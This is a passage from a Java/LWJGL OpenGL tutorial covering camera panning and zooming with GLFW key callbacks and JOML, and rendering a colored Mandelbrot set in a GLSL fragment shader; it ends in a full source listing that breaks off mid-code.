GL30.glCompileShader(fragShaderObj); GL30.glAttachShader(programID, vertShaderObj); GL30.glAttachShader(programID, fragShaderObj); GL30.glLinkProgram(programID); GL30.glValidateProgram(programID); GL30.glUseProgram(programID); // Run the rendering loop until the user has attempted to close // the window or has pressed the ESCAPE key. while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer // Camera try (MemoryStack stack = MemoryStack.stackPush()) { FloatBuffer projection = pmatrix.get(stack.mallocFloat(4 * 4)); int mat4location = GL30.glGetUniformLocation(programID, &quot;u_MVP&quot;); GL30.glUniformMatrix4fv(mat4location, false, projection); } GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our square glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents(); } } private static String parseShaderFromFile(String filePath) { StringBuilder data = new StringBuilder(); String line = &quot;&quot;; try { BufferedReader reader = new BufferedReader(new InputStreamReader(Application.class.getResourceAsStream(filePath))); line = reader.readLine(); while( line != null ) { data.append(line); data.append(&#39;\\n&#39;); line = reader.readLine(); } } catch(Exception e) { throw new IllegalArgumentException(&quot;Unable to load shader from: &quot; + filePath, e); } return data.toString(); } public static void main(String[] args) { new Application().run(); }}Panning the CameraTo pan our camera around we are going to start taking some user input. Inside of our init function we can declare some key call backs using glfw, in fact one is already defined for us to close the window when pressing escape. If you check out glfw’s input guide you’ll note that the options available for action are GLFW_PRESS, GLFW_RELEASE and GLFW_REPEAT. As it turns out none of these allow for the pressing and holding of a key to move our camera around. Instead we are going to set up some booleans which are true only when the key is pressed, and then are false when it gets released. We can then poll these booleans within our main loop to move our camera around. Here is a quick example of how we would do so.We will declare some booleans at the top of our Application.java:// Camera Panning Inputprivate boolean upArrow = false;private boolean downArrow = false;private boolean rightArrow = false;private boolean leftArrow = false;Then we will modify these booleans in our key callback when their respective key is pressed or released:glfwSetKeyCallback(window, (window, key, scancode, action, mods) -&amp;gt; { if ( key == GLFW_KEY_ESCAPE &amp;amp;&amp;amp; action == GLFW_RELEASE ) { glfwSetWindowShouldClose(window, true); // We will detect this in the rendering loop } // Up Arrow Key if (key == GLFW_KEY_UP &amp;amp;&amp;amp; action == GLFW_PRESS) { upArrow = true; } if(key == GLFW_KEY_UP &amp;amp;&amp;amp; action == GLFW_RELEASE) { upArrow = false; } // Down Arrow Key if (key == GLFW_KEY_DOWN &amp;amp;&amp;amp; action == GLFW_PRESS) { downArrow = true; } if(key == GLFW_KEY_DOWN &amp;amp;&amp;amp; action == GLFW_RELEASE) { downArrow = false; } // Left Arrow Key if (key == GLFW_KEY_LEFT &amp;amp;&amp;amp; action == GLFW_PRESS) { leftArrow = true; } if(key == GLFW_KEY_LEFT &amp;amp;&amp;amp; action == GLFW_RELEASE) { leftArrow = false; } // Right Arrow Key if (key == GLFW_KEY_RIGHT &amp;amp;&amp;amp; action == GLFW_PRESS) { rightArrow = true; } if(key == GLFW_KEY_RIGHT &amp;amp;&amp;amp; action == GLFW_RELEASE) { rightArrow = false; }});With that all setup its time to move the camera. In our main program loop we will check the value of these booleans every frame and if one is held we will pan our camera in that direction:float cameraSpeed = 0.0125f;// Run the rendering loop until the user has attempted to close// the window or has pressed the ESCAPE key.while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer // Camera Panning if(upArrow) { // Translate the projection matrix by the distance cameraSpeed in the positive y direction pmatrix.translate(new Vector3f(0.0f, cameraSpeed, 0.0f)); } if(downArrow) { // Translate the projection matrix by the distance cameraSpeed in the negative y direction pmatrix.translate(new Vector3f(0.0f, -cameraSpeed, 0.0f)); } if(rightArrow) { // Translate the projection matrix by the distance cameraSpeed in the positive x direction pmatrix.translate(new Vector3f(cameraSpeed, 0.0f, 0.0f)); } if(leftArrow) { // Translate the projection matrix by the distance cameraSpeed in the negative x direction pmatrix.translate(new Vector3f(-cameraSpeed, 0.0f, 0.0f)); } // Camera try (MemoryStack stack = MemoryStack.stackPush()) { FloatBuffer projection = pmatrix.get(stack.mallocFloat(4 * 4)); int mat4location = GL30.glGetUniformLocation(programID, &quot;u_MVP&quot;); GL30.glUniformMatrix4fv(mat4location, false, projection); } GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our square glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents();}Here we are using JOML’s translate function to move our projection matrix by a 3 float vector. The 3 floats in this vector represent the x, y and z direction. For example when we press the up arrow key we move the projection matrix by the distance cameraSpeed specified above in the positive y direction.If you now go ahead and run the program you can pan the camera using the arrow keys and it should be nice and smooth.ZoomingZooming is relatively easy to implement using our projection. Lets first set up some more booleans for polling the zooming keys being held down. This will be just the same as it was for panning.Here are our instance variables:// Zoomingprivate boolean zoomingIn = false;private boolean zoomingOut = false;Then we update them in the key callback, same as before:// Zooming In (Z Key)if (key == GLFW_KEY_Z &amp;amp;&amp;amp; action == GLFW_PRESS) { zoomingIn = true;}if (key == GLFW_KEY_Z &amp;amp;&amp;amp; action == GLFW_RELEASE) { zoomingIn = false;}// Zooming Out (X Key)if (key == GLFW_KEY_X &amp;amp;&amp;amp; action == GLFW_PRESS) { zoomingOut = true;}if (key == GLFW_KEY_X &amp;amp;&amp;amp; action == GLFW_RELEASE) { zoomingOut = false;}Now we can finally use these in our main loop to zoom in and out. Luckily for us, JOML provides quite a few different scaling functions. The one we are going to use is called scaleLocal. This scaling function will apply the scaling after any vector translation has been done (ie, after the camera’s position is taken into account). This works great for us as it means we can zoom the camera towards the center of it’s view no matter where it is positioned.Here is how we are going to implement this zooming in our main loop:// Zoomingif(zoomingIn) { pmatrix.scaleLocal(1.05f); // Zoom In} else if(zoomingOut) { pmatrix.scaleLocal(1 / 1.05f); // Zoom Out}If you now go ahead and run the program you’ll see you can now zoom in and out after panning the camera and all works smoothly. One problem does remain however. We aren’t modifying our panning speed based on how much we are zoomed in. This means after you zoom in a great distance panning feels insanely fast and jumps you across the screen. To counteract this we are going to keep track of how far the camera is zoomed and scale the panning speed based off of this value. Here is how I did that:float basePanningSpeed = 0.0125f;float currentPanningSpeed = 0.0125f;float zoomAmount = 1.0f;float zoomSpeed = 1.05f;// Run the rendering loop until the user has attempted to close// the window or has pressed the ESCAPE key.while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer // Camera Panning if(upArrow) { // Translate the projection matrix by the distance cameraSpeed in the positive y direction pmatrix.translate(new Vector3f(0.0f, currentPanningSpeed, 0.0f)); } if(downArrow) { // Translate the projection matrix by the distance cameraSpeed in the negative y direction pmatrix.translate(new Vector3f(0.0f, -currentPanningSpeed, 0.0f)); } if(rightArrow) { // Translate the projection matrix by the distance cameraSpeed in the positive x direction pmatrix.translate(new Vector3f(currentPanningSpeed, 0.0f, 0.0f)); } if(leftArrow) { // Translate the projection matrix by the distance cameraSpeed in the negative x direction pmatrix.translate(new Vector3f(-currentPanningSpeed, 0.0f, 0.0f)); } // Zooming if(zoomingIn) { zoomAmount = zoomAmount * zoomSpeed; // Update the zoomAmount currentPanningSpeed = basePanningSpeed / zoomAmount; // Update camera panning speed pmatrix.scaleLocal(zoomSpeed); // Zoom In } else if(zoomingOut) { zoomAmount = zoomAmount * (1 / zoomSpeed); // Update the zoomAmount currentPanningSpeed = basePanningSpeed / zoomAmount; // Update camera panning speed pmatrix.scaleLocal(1 / zoomSpeed); // Zoom Out } // Camera try (MemoryStack stack = MemoryStack.stackPush()) { FloatBuffer projection = pmatrix.get(stack.mallocFloat(4 * 4)); int mat4location = GL30.glGetUniformLocation(programID, &quot;u_MVP&quot;); GL30.glUniformMatrix4fv(mat4location, false, projection); } GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our square glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents();}What I have done is created a variable called zoomAmount which keeps track of how far in we are currently zoomed. Therefore each time we zoom in I have to not only scale the projection matrix by zoomSpeed but also scale zoomAmount by zoomSpeed likewise. I can then use this zoomAmount to generate a new panningSpeed based off of the basePanningSpeed. With that in place we are done with the camera! For reference here is the entirety of Application.java with a working camera implemented:import org.joml.Matrix4f;import org.joml.Vector3f;import org.lwjgl.*;import org.lwjgl.glfw.*;import org.lwjgl.opengl.*;import org.lwjgl.system.*;import java.io.BufferedReader;import java.io.InputStreamReader;import java.nio.*;import static org.lwjgl.glfw.Callbacks.*;import static org.lwjgl.glfw.GLFW.*;import static org.lwjgl.opengl.GL11.*;import static org.lwjgl.system.MemoryStack.*;import static org.lwjgl.system.MemoryUtil.*;public class Application { // The window handle private long window; // Projection Matrix private Matrix4f pmatrix = new Matrix4f().ortho(-2.0f, 2.0f, -2.0f, 2.0f, -1.0f, 1.0f); // Camera Panning Input private boolean upArrow = false; private boolean downArrow = false; private boolean rightArrow = false; private boolean leftArrow = false; // Zooming private boolean zoomingIn = false; private boolean zoomingOut = false; public void run() { System.out.println(&quot;Hello LWJGL &quot; + Version.getVersion() + &quot;!&quot;); init(); loop(); // Free the window callbacks and destroy the window glfwFreeCallbacks(window); glfwDestroyWindow(window); // Terminate GLFW and free the error callback glfwTerminate(); glfwSetErrorCallback(null).free(); } private void init() { // Setup an error callback. The default implementation // will print the error message in System.err. GLFWErrorCallback.createPrint(System.err).set(); // Initialize GLFW. Most GLFW functions will not work before doing this. if ( !glfwInit() ) throw new IllegalStateException(&quot;Unable to initialize GLFW&quot;); // Configure GLFW glfwDefaultWindowHints(); // optional, the current window hints are already the default glfwWindowHint(GLFW_VISIBLE, GLFW_FALSE); // the window will stay hidden after creation glfwWindowHint(GLFW_RESIZABLE, GLFW_TRUE); // the window will be resizable // Create the window window = glfwCreateWindow(960 / 2, 960 / 2, &quot;Hello World!&quot;, NULL, NULL); if ( window == NULL ) throw new RuntimeException(&quot;Failed to create the GLFW window&quot;); // Setup a key callback. It will be called every time a key is pressed, repeated or released. glfwSetKeyCallback(window, (window, key, scancode, action, mods) -&amp;gt; { if ( key == GLFW_KEY_ESCAPE &amp;amp;&amp;amp; action == GLFW_RELEASE ) { glfwSetWindowShouldClose(window, true); // We will detect this in the rendering loop } // Up Arrow Key if (key == GLFW_KEY_UP &amp;amp;&amp;amp; action == GLFW_PRESS) { upArrow = true; } if(key == GLFW_KEY_UP &amp;amp;&amp;amp; action == GLFW_RELEASE) { upArrow = false; } // Down Arrow Key if (key == GLFW_KEY_DOWN &amp;amp;&amp;amp; action == GLFW_PRESS) { downArrow = true; } if(key == GLFW_KEY_DOWN &amp;amp;&amp;amp; action == GLFW_RELEASE) { downArrow = false; } // Left Arrow Key if (key == GLFW_KEY_LEFT &amp;amp;&amp;amp; action == GLFW_PRESS) { leftArrow = true; } if(key == GLFW_KEY_LEFT &amp;amp;&amp;amp; action == GLFW_RELEASE) { leftArrow = false; } // Right Arrow Key if (key == GLFW_KEY_RIGHT &amp;amp;&amp;amp; action == GLFW_PRESS) { rightArrow = true; } if(key == GLFW_KEY_RIGHT &amp;amp;&amp;amp; action == GLFW_RELEASE) { rightArrow = false; } // Zooming In (Z Key) if (key == GLFW_KEY_Z &amp;amp;&amp;amp; action == GLFW_PRESS) { zoomingIn = true; } if (key == GLFW_KEY_Z &amp;amp;&amp;amp; action == GLFW_RELEASE) { zoomingIn = false; } // Zooming Out (X Key) if (key == GLFW_KEY_X &amp;amp;&amp;amp; action == GLFW_PRESS) { zoomingOut = true; } if (key == GLFW_KEY_X &amp;amp;&amp;amp; action == GLFW_RELEASE) { zoomingOut = false; } }); // Get the thread stack and push a new frame try ( MemoryStack stack = stackPush() ) { IntBuffer pWidth = stack.mallocInt(1); // int* IntBuffer pHeight = stack.mallocInt(1); // int* // Get the window size passed to glfwCreateWindow glfwGetWindowSize(window, pWidth, pHeight); // Get the resolution of the primary monitor GLFWVidMode vidmode = glfwGetVideoMode(glfwGetPrimaryMonitor()); // Center the window glfwSetWindowPos( window, (vidmode.width() - pWidth.get(0)) / 2, (vidmode.height() - pHeight.get(0)) / 2 ); } // the stack frame is popped automatically // Make the OpenGL context current glfwMakeContextCurrent(window); // Enable v-sync glfwSwapInterval(1); // Make the window visible glfwShowWindow(window); } private void loop() { // This line is critical for LWJGL&#39;s interoperation with GLFW&#39;s // OpenGL context, or any context that is managed externally. // LWJGL detects the context that is current in the current thread, // creates the GLCapabilities instance and makes the OpenGL // bindings available for use. GL.createCapabilities(); // Set the clear color glClearColor(1.0f, 0.0f, 0.0f, 0.0f); // Vertices - Positions float[] vertices = new float[] { -1.0f, 1.0f, // Vertex 0 -1.0f, -1.0f, // Vertex 1 1.0f, -1.0f, // Vertex 2 1.0f, 1.0f // Vertex 3 }; // VBO (Vertex Buffer Object) FloatBuffer vboBuffer = BufferUtils.createFloatBuffer(vertices.length); for(float vertex : vertices) { vboBuffer.put(vertex); } vboBuffer.flip(); // Pass data to GPU int positionElementCount = vertices.length / 4; int vboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ARRAY_BUFFER, vboID); GL30.glBufferData(GL30.GL_ARRAY_BUFFER, vboBuffer, GL30.GL_STATIC_DRAW); GL30.glVertexAttribPointer(0, positionElementCount, GL_FLOAT, false, positionElementCount * Float.BYTES, 0); GL30.glEnableVertexAttribArray(0); // Indices int[] indices = new int[] { 0, 1, 2, 2, 3, 0 }; // IBO (Index Buffer Object) IntBuffer iboBuffer = BufferUtils.createIntBuffer(indices.length); for(int index : indices) { iboBuffer.put(index); } iboBuffer.flip(); // Pass data to GPU int iboID = GL30.glGenBuffers(); GL30.glBindBuffer(GL30.GL_ELEMENT_ARRAY_BUFFER, iboID); GL30.glBufferData(GL30.GL_ELEMENT_ARRAY_BUFFER, iboBuffer, GL30.GL_STATIC_DRAW); // Shaders int programID = GL30.glCreateProgram(); int vertShaderObj = GL30.glCreateShader(GL30.GL_VERTEX_SHADER); int fragShaderObj = GL30.glCreateShader(GL30.GL_FRAGMENT_SHADER); String vertexShader = parseShaderFromFile(&quot;/shaders/vert.shader&quot;); GL30.glShaderSource(vertShaderObj, vertexShader); GL30.glCompileShader(vertShaderObj); String fragmentShader = parseShaderFromFile(&quot;/shaders/frag.shader&quot;); GL30.glShaderSource(fragShaderObj, fragmentShader); GL30.glCompileShader(fragShaderObj); GL30.glAttachShader(programID, vertShaderObj); GL30.glAttachShader(programID, fragShaderObj); GL30.glLinkProgram(programID); GL30.glValidateProgram(programID); GL30.glUseProgram(programID); float basePanningSpeed = 0.0125f; float currentPanningSpeed = 0.0125f; float zoomAmount = 1.0f; float zoomSpeed = 1.05f; // Run the rendering loop until the user has attempted to close // the window or has pressed the ESCAPE key. while ( !glfwWindowShouldClose(window) ) { glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // clear the framebuffer // Camera Panning if(upArrow) { // Translate the projection matrix by the distance cameraSpeed in the positive y direction pmatrix.translate(new Vector3f(0.0f, currentPanningSpeed, 0.0f)); } if(downArrow) { // Translate the projection matrix by the distance cameraSpeed in the negative y direction pmatrix.translate(new Vector3f(0.0f, -currentPanningSpeed, 0.0f)); } if(rightArrow) { // Translate the projection matrix by the distance cameraSpeed in the positive x direction pmatrix.translate(new Vector3f(currentPanningSpeed, 0.0f, 0.0f)); } if(leftArrow) { // Translate the projection matrix by the distance cameraSpeed in the negative x direction pmatrix.translate(new Vector3f(-currentPanningSpeed, 0.0f, 0.0f)); } // Zooming if(zoomingIn) { zoomAmount = zoomAmount * zoomSpeed; // Update the zoomAmount currentPanningSpeed = basePanningSpeed / zoomAmount; // Update camera panning speed pmatrix.scaleLocal(zoomSpeed); // Zoom In } else if(zoomingOut) { zoomAmount = zoomAmount * (1 / zoomSpeed); // Update the zoomAmount currentPanningSpeed = basePanningSpeed / zoomAmount; // Update camera panning speed pmatrix.scaleLocal(1 / zoomSpeed); // Zoom Out } // Camera try (MemoryStack stack = MemoryStack.stackPush()) { FloatBuffer projection = pmatrix.get(stack.mallocFloat(4 * 4)); int mat4location = GL30.glGetUniformLocation(programID, &quot;u_MVP&quot;); GL30.glUniformMatrix4fv(mat4location, false, projection); } GL30.glDrawElements(GL30.GL_TRIANGLES, indices.length, GL_UNSIGNED_INT, 0); //Draw our square glfwSwapBuffers(window); // swap the color buffers // Poll for window events. The key callback above will only be // invoked during this call. glfwPollEvents(); } } private static String parseShaderFromFile(String filePath) { StringBuilder data = new StringBuilder(); String line = &quot;&quot;; try { BufferedReader reader = new BufferedReader(new InputStreamReader(Application.class.getResourceAsStream(filePath))); line = reader.readLine(); while( line != null ) { data.append(line); data.append(&#39;\\n&#39;); line = reader.readLine(); } } catch(Exception e) { throw new IllegalArgumentException(&quot;Unable to load shader from: &quot; + filePath, e); } return data.toString(); } public static void main(String[] args) { new Application().run(); }}The Mandelbrot Set FractalIf you aren’t already aware of how the Mandelbrot Set works I will attempt to give a brief overview here but I recommend checking out some resources much better at explaining it than me such as this numberphile video or the wikipedia page.The Mandelbrot Set is a set of complex numbers which when drawn on the complex plane produces a very distinct pattern. This pattern is known as a fractal because you can infinitely zoom into the complex plane and it will produce different patterns as you continue to zoom forever. The Mandelbrot Set is one of the more popular fractals because it is simple enough to understand and produces some incredible patterns when colored using a good coloring function. The main goal of this tutorial series was to create this fractal using a shader in OpenGL and explore the infinite patterns it produces by panning around and zooming in and out.To get started we first need a tiny bit of maths. I believe wikipedia’s explanation is best:Since we are dealing with complex numbers we can simply use the 2D coordinates of our screen as the complex plane. You may remember from part one that our fragment shader is run on every pixel in between the vertices of our square so this is perfect for us. Our 2D coordinates are stored in vec2’s in OpenGL making treating them as complex numbers easy. One of the basic properties of the Mandelbrot Set is that it is compact, meaning it is all contained within a radius 2 circle around the origin of the complex plane. Now it should make sense why we made the bounds of our camera range from -2.0 to 2.0. A point is considered to belong to the set if, after a certain number of iterations of the function listed above, the magnitude of the complex number never becomes greater than 2. This number of iterations is something we can control within our code and the more iterations you check for every pixel, the more precise the mandelbrot set image. However, this does come at the cost of performance as there are more calculations being done per pixel.Hopefully my explanation was somewhat clear but if not I once again recommend the tutorials linked above. Finally we can get to generating the set ourselves. First off we should begin by making our square fill the entire -2.0 to 2.0 screen size by replacing the vertices positions array with the following:// Vertices - Positionsfloat[] vertices = new float[] { -2.0f, 2.0f, // Vertex 0 -2.0f, -2.0f, // Vertex 1 2.0f, -2.0f, // Vertex 2 2.0f, 2.0f // Vertex 3};Now that our square fills the screen we can get to writing our fragment shader.The Fragment ShaderTo begin writing our fragment shader we are going to need some way to reference the current pixel position the fragment shader is being applied to. To do this we will pass the position from the vertex shader to the fragment shader. The passing of data between shaders is done using something called a varying. Varying’s can be declared using the out and in keyword. Here is how we do this and a quick test to make sure it works:Vertex Shaderlayout(location = 0) in vec2 position;uniform mat4 u_MVP;out vec2 v_Pos;void main() { gl_Position = u_MVP * vec4(position, 0, 1.0); v_Pos = position;}Fragment Shaderin vec2 v_Pos;void main() { if(v_Pos.x &amp;gt; 0.5) { gl_FragColor = vec4(0.3, 0.0, 0.3, 1.0); } else { gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0); }}As you can see I have created a varying called v_Pos in the vertex shader (I like to use the convention of a v_Something for varying) and declared it as going out from the vertex shader. I then set it equal to the position in the main function. In the fragment shader I take in this varying and then use it in a quick test to draw the right quarter of the square as purple and the rest black. If everything works correctly the square will look like this:Now that that is set up we can begin implementing the Mandelbrot Set’s function. If you remember the function requires the squaring of an imaginary number. I could not find any built in OpenGL functions for doing this using a vec2 so I’ve gone ahead and wrote my own:vec2 squareImaginary(vec2 imaginaryNum) { vec2 imaginaryResult; imaginaryResult.x = (imaginaryNum.x * imaginaryNum.x) - (imaginaryNum.y * imaginaryNum.y); imaginaryResult.y = 2 * imaginaryNum.x * imaginaryNum.y; return imaginaryResult;}(If you want to get better at using GLSL I recommend this video series which I mentioned in part one)Then in our main line we can use it to generate a black and white version of the Mandelbrot Set:in vec2 v_Pos;vec2 squareImaginary(vec2 imaginaryNum) { vec2 imaginaryResult; imaginaryResult.x = (imaginaryNum.x * imaginaryNum.x) - (imaginaryNum.y * imaginaryNum.y); imaginaryResult.y = 2 * imaginaryNum.x * imaginaryNum.y; return imaginaryResult;}void main() { vec2 c, z; c = v_Pos; // c starts as the current position z = c; // We can skip one iteration of the function where z = 0 as it is uneccessary if we simply set z = c vec3 color = vec3(0.0, 0.0, 0.0); // The default color will be black int iterations = 100; // 100 is a good number of iterations for(int i = 0; i &amp;lt; iterations; i++) { // fc(z) = z^2 + c - Here we iterate over this function until it either becomes greater than 2 or not vec2 result = squareImaginary(z) + c; if(length(result) &amp;gt; 2.0) { // This is a point not in the mandelbrot set - Change color to white color = vec3(1.0, 1.0, 1.0); break; } z = result; } // Color the point gl_FragColor = vec4(color, 1.0);}You can already pan around and zoom in and potentially see some cool patterns but since it is just black and white it may not look too great.Coloring FunctionIf you have ever seen videos or pictures of the Mandelbrot Set it likely was colored in some way to make it look much better and make the patterns more impressive. To achieve this effect we are going to use a coloring function. If you wish to learn about lots of various coloring methods and how they work check out this web page on the topic.One coloring technique mentioned on that website is “escape time based coloring”. With this technique instead of coloring pixels not within the set white if its length becomes &amp;gt;2 we will color the pixel based on the number of iterations it took to become &amp;gt;2. To implement this we simply have to make one small modification to our main function inside the fragment shader:for(int i = 0; i &amp;lt; iterations; i++) { // fc(z) = z^2 + c - Here we iterate over this function until it either becomes greater than 2 or not vec2 result = squareImaginary(z) + c; if(length(result) &amp;gt; 2.0) { // This is a point not in the mandelbrot set - Change color based on iterations color = colorFunc(i); break; } z = result;}Here i is our number of iterations so we are going to pass this value to a special color function which returns a color based on it. There are many ways we could define such a color function but I chose to use HSV values where the Hue and Value are based on the number of iterations. This HSV value is then converted to RGB and returned by the function.vec3 colorFunc(int iter) { // Color in HSV - Tweak these values to your liking and for different coloring effects vec3 color = vec3(0.012*iter , 1.0, 0.2+.4*(1.0+sin(0.3*iter))); // Convert from HSV to RGB // Taken from: http://lolengine.net/blog/2013/07/27/rgb-to-hsv-in-glsl vec4 K = vec4(1.0, 2.0 / 3.0, 1.0 / 3.0, 3.0); vec3 m = abs(fract(color.xxx + K.xyz) * 6.0 - K.www); return vec3(color.z * mix(K.xxx, clamp(m - K.xxx, 0.0, 1.0), color.y));}Our full fragment shader for generating the Mandelbrot Set is now complete! Here is it in its entirety:in vec2 v_Pos;vec2 squareImaginary(vec2 imaginaryNum) { vec2 imaginaryResult; imaginaryResult.x = (imaginaryNum.x * imaginaryNum.x) - (imaginaryNum.y * imaginaryNum.y); imaginaryResult.y = 2 * imaginaryNum.x * imaginaryNum.y; return imaginaryResult;}vec3 colorFunc(int iter) { // Color in HSV - Tweak these values to your liking and for different coloring effects vec3 color = vec3(0.012*iter , 1.0, 0.2+.4*(1.0+sin(0.3*iter))); // Convert from HSV to RGB // Taken from: http://lolengine.net/blog/2013/07/27/rgb-to-hsv-in-glsl vec4 K = vec4(1.0, 2.0 / 3.0, 1.0 / 3.0, 3.0); vec3 m = abs(fract(color.xxx + K.xyz) * 6.0 - K.www); return vec3(color.z * mix(K.xxx, clamp(m - K.xxx, 0.0, 1.0), color.y));}void main() { vec2 c, z; c = v_Pos; // c starts as the current position z = c; // We can skip one iteration of the function where z = 0 as it is uneccessary if we simply set z = c vec3 color = vec3(0.0, 0.0, 0.0); // The default color will be black int iterations = 100; // 100 is a good number of iterations for(int i = 0; i &amp;lt; iterations; i++) { // fc(z) = z^2 + c - Here we iterate over this function until it either becomes greater than 2 or not vec2 result = squareImaginary(z) + c; if(length(result) &amp;gt; 2.0) { // This is a point not in the mandelbrot set - Change color based on iterations color = colorFunc(i); break; } z = result; } // Color the point gl_FragColor = vec4(color, 1.0);}Running the program and exploring around will produce all kinds of incredible fractal patterns (If you haven’t already you could switch the program resolution from 480x480 to 960x960 now as it will look much better):LimitationsNow that we’ve finally completed the project I wanted to discuss some of the limitations of the implementation and perhaps lay out some future tasks for you to try.You may have already noticed that if you zoom in far enough on the set it will begin to break down and look more and more pixelated until you cannot zoom anymore.The reason for this is due to the fact that OpenGL handles everything in 32-bit floats. We use these floats for our vertices data, our camera position and within our shader code. This means that as you zoom in more and more you start to deal with smaller and smaller numbers until they are too small to be represented by a float. One quick improvement for this can be done by adding this line to the top of the fragment shader:precision highp float;However, this change will be quite minute. Instead the best way to improve this would be to switch from using floats to doubles. OpenGL does in fact support the use of doubles for both vertex attributes and uniforms as of a somewhat recent update. As a possible task to test what you’ve learned you could try implementing this program from scratch using doubles. This update adds double uniforms and this one adds support for double vertex attributes and each will detail the required functions. One thing to note is we used JOML Matrices of type float, Matrix4f, but you can use doubles by doing Matrix4d. If you do manage to get this working please share it with me in the comments!One final challenge would be to create an infinite zoom. Some online resources detail how to do this using a lot of vector math or OpenCL (OpenGL for computing tasks) but I will leave research of this up to you.ConclusionThat’s it for the tutorial series! If you came all the way from the beginning, thanks so much for reading all the way through and even if you didn’t thanks so much for reading in general. I hope my explanations were clear and well understood. If you did note any problems leave a comment so I can possibly make some additions or changes in the future. As I mentioned in part one if you want to check out my original version of this project it can be found on my github. (This version has an implemented UI and settings and as well as that a lot of concepts covered here such as the Camera are abstracted into their own classes)- Cian JinksFull Source CodeApplication.javaimport org.joml.Matrix4f;import org.joml.Vector3f;import org.lwjgl.*;import org.lwjgl.glfw.*;import org.lwjgl.opengl.*;import org.lwjgl.system.*;import java.io.BufferedReader;import java.io.InputStreamReader;import java.nio.*;import static org.lwjgl.glfw.Callbacks.*;import static org.lwjgl.glfw.GLFW.*;import static org.lwjgl.opengl.GL11.*;import static org.lwjgl.system.MemoryStack.*;import static org.lwjgl.system.MemoryUtil.*;public class Application { // The window handle private long window; // Projection Matrix private Matrix4f pmatrix = new Matrix4f().ortho(-2.0f, 2.0f, -2.0f, 2.0f, -1.0f, 1.0f); // Camera Panning Input private boolean upArrow = false; private boolean downArrow = false; private boolean rightArrow = false; private boolean leftArrow = false; // Zooming private boolean zoomingIn = false; private boolean zoomingOut = false; public void run() { System.out.println(&quot;Hello LWJGL &quot; + Version.getVersion() + &quot;!&quot;); init(); loop(); // Free the window callbacks and destroy the window glfwFreeCallbacks(window); glfwDestroyWindow(window); // Terminate GLFW and free the error callback glfwTerminate(); glfwSetErrorCallback(null).free(); } private void init() { // Setup an error callback. The default implementation // will print the error message in System.err. GLFWErrorCallback.createPrint(System.err).set(); // Initialize GLFW. Most GLFW functions will not work before doing this. if ( !glfwInit() ) throw new IllegalStateException(&quot;Unable to initialize GLFW&quot;); // Configure GLFW glfwDefaultWindowHints(); // optional, the current window hints are already the default glfwWindowHint(GLFW_VISIBLE, GLFW_FALSE); // the window will stay hidden after creation glfwWindowHint(GLFW_RESIZABLE, GLFW_TRUE); // the window will be resizable // Create the window window = glfwCreateWindow(960 / 2, 960 / 2, &quot;Hello World!&quot;, NULL, NULL); if ( window == NULL ) throw new RuntimeException(&quot;Failed to create the GLFW window&quot;); // Setup a key callback. It will be called every time a key is pressed, repeated or released. glfwSetKeyCallback(window, (window, key, scancode, action, mods) -&amp;gt; { if ( key == GLFW_KEY_ESCAPE &amp;amp;&amp;amp; action == GLFW_RELEASE ) { glfwSetWindowShouldClose(window, true); // We will detect this in the rendering loop } // Up Arrow Key if (key == GLFW_KEY_UP &amp;amp;&amp;amp; action == GLFW_PRESS) { upArrow = true; } if(key == GLFW_KEY_UP &amp;amp;&amp;amp; action == GLFW_RELEASE) { upArrow = false; } // Down Arrow Key if (key == GLFW_KEY_DOWN &amp;amp;&amp;amp; action == GLFW_PRESS) { downArrow = true; } if(key == GLFW_KEY_DOWN &amp;amp;&amp;amp; action == GLFW_RELEASE) { downArrow = false; } // Left Arrow Key if (key == GLFW_KEY_LEFT &amp;amp;&amp;amp; action == GLFW_PRESS) { leftArrow = true; } if(key == GLFW_KEY_LEFT &amp;amp;&amp;amp; action == GLFW_RELEASE) { leftArrow = false; } // Right Arrow Key if (key == GLFW_KEY_RIGHT &amp;amp;&amp;amp; action == GLFW_PRESS) { rightArrow = true; } if(key == GLFW_KEY_RIGHT &amp;amp;&amp;amp; action == GLFW_RELEASE) { rightArrow = false; } // Zooming In (Z Key) if (key == GLFW_KEY_Z &amp;amp;&amp;amp; action == GLFW_PRESS) { zoomingIn = true; } if (key == GLFW_KEY_Z &amp;amp;&amp;amp; action == GLFW_RELEASE) { zoomingIn = false; } // Zooming Out (X Key) if (key == GLFW_KEY_X &amp;amp;&amp;amp; action == GLFW_PRESS) { zoomingOut = true; } if (key == GLFW_KEY_X &amp;amp;&amp;amp; action == GLFW_RELEASE) { zoomingOut = false; } }); // Get the thread stack and push a new frame try ( MemoryStack stack = stackPush() ) { IntBuffer pWidth = stack.mallocInt(1); // int* IntBuffer pHeight = stack.mallocInt(1); // int* // Get the window size passed to glfwCreateWindow glfwGetWindowSize(window, pWidth, pHeight); // Get the resolution of the primary monitor GLFWVidMode vidmode = glfwGetVideoMode(glfwGetPrimaryMonitor()); // Center the window glfwSetWindowPos( window, (vidmode.width() - pWidth.get(0)) / 2, (vidmode.height() - pHeight.get(0)) / 2 ); } // the stack frame is popped automatically // Make the OpenGL context current glfwMakeContextCurrent(window); // Enable v-sync glfwSwapInterval(1); // Make the window visible glfwShowWindow(window); } private void loop() { // This line is critical for LWJGL&#39;s interoperation with GLFW&#39;s // OpenGL context, or any context that is managed externally. // LWJGL detects the context that is current in the current thread, // creates the GLCapabilities instance and makes the OpenGL // bindings available for use. GL.createCapabilities(); // Set the clear color glClearColor(1.0f, 0.0f, 0.0f, 0.0f); // Vertices - Positions float[] 